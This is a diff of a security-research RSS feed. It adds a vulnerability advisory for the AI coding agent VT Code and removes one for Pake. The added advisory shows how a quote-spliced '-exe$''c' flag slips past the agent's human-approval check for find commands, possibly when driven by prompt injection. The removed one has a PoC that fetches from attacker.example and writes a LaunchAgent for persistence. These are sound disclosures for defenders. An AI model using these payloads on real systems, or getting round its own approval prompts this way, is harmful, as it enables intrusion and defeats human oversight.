@@ -4,11 +4,126 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Mon, 05 Oct 2026 00:44:46 GMT</lastBuildDate>
+        <lastBuildDate>Mon, 05 Oct 2026 09:46:45 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/rss.xml" rel="self" type="application/rss+xml"/>
+        <item>
+            <title><![CDATA[VT Code is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/vtcode-is-vulnerable-to-arbitrary-command-execution-via-an-ansi-c-quote-bypass-of-the-find-approval-check-cve-2026-104247-jfsa-2026-001694179/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/vtcode-is-vulnerable-to-arbitrary-command-execution-via-an-ansi-c-quote-bypass-of-the-find-approval-check-cve-2026-104247-jfsa-2026-001694179/</guid>
+            <pubDate>Mon, 05 Oct 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-104247, MEDIUM, VT Code is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+VT Code is vulnerable to Arbitrary Command Execution via an ANSI-C Quote Bypass of the find Approval Check
+
+
+## Component
+
+vtcode (github.com/vinhnx/VTCode)
+
+## Affected versions
+
+< 0.171.5
+
+## Description
+
+VT Code learns a family of safe `find` commands after a person approves three ordinary finds under the same workspace subdirectory. Later commands that share that family key run with no further prompt. The check that keeps destructive options out of the family compares tokens exactly (`-exec`, `-delete`, and a short list of siblings) in `is_destructive_find_option` inside `src/agent/runloop/unified/tool_routing/shell_approval.rs`.
+
+An empty ANSI-C quote spliced into the flag (`-exe$''c`) does not match that list, so `learned_find_pattern` still treats the command as a safe find. Once the family has been learned, `prompt_tool_permission` auto-approves it and the shell runs it. The proven result is command execution as the user running VT Code, without a new approval prompt. Reaching that point takes a local session, those prior approvals, and something that can steer the agent, such as indirect prompt injection.
+
+## PoC
+
+<br>
+
+**Step 1 - Install a vulnerable VT Code and open a trusted workspace**
+
+<br>
+
+Use VT Code before 0.171.5 with the default approval prompts (HITL) enabled. The workspace needs a `src` directory.
+
+```
+cargo install vtcode --version 0.171.4
+```
+
+<br>
+
+**Step 2 - Approve three distinct safe finds**
+
+<br>
+
+Ask the agent to run each of these, and approve each prompt. They must share the same top-level directory:
+
+```
+find src -type f -name '*.rs'
+find src -type d
+find src -name foo
+```
+
+<br>
+
+**Step 3 - Confirm the family now auto-approves**
+
+<br>
+
+Ask for another ordinary find under `src`. VT Code should run it with no new prompt.
+
+```
+find src -type f
+```
+
+<br>
+
+**Step 4 - Send the spliced find**
+
+<br>
+
+```
+find src -maxdepth 0 -exe$''c touch /tmp/VT_BYPASS_POC {} +
+```
+
+<br>
+
+**Step 5 - Confirm the command ran without a prompt**
+
+<br>
+
+```
+ls -l /tmp/VT_BYPASS_POC
+```
+
+<br>
+
+Expected output:
+
+```
+-rw-r--r--  1 <user>  <group>  0 <date> /tmp/VT_BYPASS_POC
+```
+
+<br>
+
+On 0.171.5 or later, the same command does not inherit the safe-find family and still requires approval.
+
+## Vulnerability Mitigations
+
+Upgrade to VT Code 0.171.5 or later. The release marks every version below 0.171.5 as affected.
+
+An earlier change in 0.141.12 rejected this `$''` splice only on a bare `find`. The follow-up in 0.171.5 (https://github.com/vinhnx/VTCode/pull/778, commit 5840697cd0dc8f94b9b53d88185329eecba8de11) is the first release the advisory treats as patched. It also refuses family learning for path-qualified `find` (`./find`, `/usr/bin/find`), mixed-case or quote-spliced flags, wrapper and environment prefixes, and compound commands.
+
+Until you upgrade, do not rely on learned find approvals. Treat a workspace where an untrusted prompt can drive the agent as able to run shell commands after a few ordinary finds have been approved.
+
+## References
+https://github.com/vinhnx/VTCode/security/advisories/GHSA-r249-hpfx-x2w7
+https://github.com/vinhnx/VTCode/pull/778
+https://github.com/vinhnx/VTCode/commit/5840697cd0dc8f94b9b53d88185329eecba8de11
+https://github.com/vinhnx/VTCode/releases/tag/0.171.5
+https://www.cve.org/CVERecord?id=CVE-2026-104247
+https://github.com/vinhnx/VTCode
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Equation of Compromise: Anatomy of a Live npm Supply-Chain Campaign]]></title>
             <link>https://research.jfrog.com/post/equation-of-compromise/</link>
@@ -1090,82 +1205,6 @@ Nothing in the CVE pipeline resolves a disagreement between a vendor's score and
 The gap that opened is not a matter of opinion. The vendor wrote the affected code, holds the report, writes the fix, and runs the tests. On CVE-2026-47891 the fix moves a byte counter; on CVE-2026-59313 it handles a carriage return, and the same weakness produces the same 9.8 twice. Nobody reading those commits arrives at full confidentiality and integrity compromise. A score assigned without them can, and did.
 
 The correction requires no new policy. Until the vendor's vector reaches the CVE record, read the ADP container as an estimate made without the code. Where a vendor score and an external one disagree, that gap is a signal to verify. **Vendor-provided vectors should remain the primary assessment, while CISA's enrichment should be reserved only for records where no vendor score exists.**
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Pake is vulnerable to Arbitrary File Write via Unsanitized download_file Filename]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/pake-is-vulnerable-to-arbitrary-file-write-via-unsanitized-download-file-filename-cve-2026-82635/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/pake-is-vulnerable-to-arbitrary-file-write-via-unsanitized-download-file-filename-cve-2026-82635/</guid>
-            <pubDate>Sun, 30 Aug 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-82635, HIGH, Pake is vulnerable to Arbitrary File Write via Unsanitized download_file Filename]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Pake is vulnerable to Arbitrary File Write via Unsanitized download_file Filename
-
-
-## Component
-
-Pake (tw93/Pake)
-
-## Affected versions
-
-< 3.13.1
-
-## Description
-
-Pake before 3.13.1 joins the JavaScript-supplied filename for the download_file Tauri command onto the user's Downloads directory with no sanitization. A filename containing path traversal sequences (for example ../Library/LaunchAgents/com.evil.plist) or an absolute path resolves outside ~/Downloads. The command then fetches attacker-controlled content from the supplied URL over Rust HTTP, not the browser, and writes it to that path.
-
-A script that can invoke the command can overwrite user-writable files and install persistence, such as a macOS LaunchAgent, a Linux autostart entry, or a Windows Startup-folder payload, leading to code execution in the user account. All desktop apps generated from an affected Pake tree expose the same command. Opening the wrapped app is the required user interaction; the default Pake IPC posture makes download_file reachable from the wrapped page.
-
-## PoC
-
-<br>
-
-**Step 1 - Serve a payload over HTTP**
-
-<br>
-
-Host a small file the Pake process will fetch, for example a proof marker or a LaunchAgent plist, on an attacker-controlled HTTP URL.
-
-<br>
-
-**Step 2 - Invoke download_file with a traversing filename**
-
-<br>
-
-From JavaScript in a Pake-generated app built from a tree before 3.13.1, call the unsanitized command:
-
-```javascript
-window.__TAURI__.core.invoke('download_file', {
-  params: {
-    url: 'http://attacker.example/pake_write_proof.sh',
-    filename: '../pake_write_proof.sh'
-  }
-})
-```
-
-<br>
-
-A second invoke with filename `../Library/LaunchAgents/com.pake.poc.plist` and a plist body that runs the first file demonstrates persistence.
-
-<br>
-
-**Step 3 - Confirm the write left Downloads**
-
-<br>
-
-Expected result: the fetched files appear under the user home directory (for example ~/pake_write_proof.sh and ~/Library/LaunchAgents/com.pake.poc.plist), not under ~/Downloads. Loading the LaunchAgent, or the next login, runs the fetched payload in the user session.
-
-## Vulnerability Mitigations
-
-Upgrade Pake to 3.13.1 or later and rebuild generated apps from that tree. The fix introduces sanitize_download_filename and uses only the final path segment before joining onto the Downloads directory, so ../ sequences and absolute paths cannot escape that directory (https://github.com/tw93/Pake/commit/a5463a84d6e36705ee0dd1886cf0e4b5a75b0ab4, first tagged in V3.13.1).
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-82635
-https://github.com/tw93/Pake/commit/a5463a84d6e36705ee0dd1886cf0e4b5a75b0ab4
-https://github.com/tw93/Pake/releases/tag/V3.13.1
-https://github.com/tw93/Pake
 ]]></content:encoded>
         </item>
         <item>
